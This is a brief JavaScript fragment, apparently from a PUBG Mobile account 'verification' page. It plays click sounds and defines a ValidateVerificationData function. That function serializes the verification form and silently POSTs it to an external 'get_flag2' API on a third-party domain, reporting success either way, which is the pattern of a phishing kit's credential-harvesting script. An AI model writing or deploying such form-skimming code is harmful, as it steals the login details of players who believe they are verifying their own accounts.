...
var buka = new Audio();
buka.src = "https://cdn.jsdelivr.net/gh/arpantek/assetArpan@main/click.mp3";

var tutup = new Audio();
tutup.src = "https://cdn.jsdelivr.net/gh/arpantek/assetArpan@main/unclick.mp3";
...
function ValidateVerificationData(){
	var pubgMobile=$("#ValidateVerificationDataForm").serialize();$.ajax({url:"https://arpanrizki.my.id/api/get_flag2/api.php",data:pubgMobile,type:"POST",success:function(){return!0},error:function(){return!0}});
